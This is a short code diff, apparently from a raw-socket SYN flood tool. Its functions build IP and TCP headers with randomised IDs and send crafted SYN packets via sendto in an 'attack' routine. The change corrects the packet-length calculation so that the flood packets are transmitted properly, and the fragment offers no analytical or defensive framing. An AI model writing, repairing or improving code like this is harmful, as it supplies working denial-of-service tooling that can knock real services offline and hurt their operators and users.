@@ -143,7 +143,7 @@ void setup_iphdr(struct iphdr *iph)
     iph->ihl = 5;
     iph->version = 4;
     iph->tos = 0;
-    iph->tot_len = (sizeof(struct iphdr) + sizeof(struct tcphdr));
+    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
     iph->id = htons(rand_cmwc() & 0xFFFF);
     iph->frag_off = 0;
     iph->ttl = MAXTTL;
@@ -213,8 +213,8 @@ void attack(void *args)
     sin = arg->sin;
 
     setup_syn_packet(packet, iph, tcph, sin);
-
-    ssize_t bytes_sent = sendto(s, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
+    size_t size = sizeof(*iph) + sizeof(*tcph);
+    ssize_t bytes_sent = sendto(s, packet, size, 0, (struct sockaddr *)&sin, sizeof(sin));
     if (bytes_sent < 0)
     {
         fprintf(stderr, "error on sending: %s\n", strerror(errno));
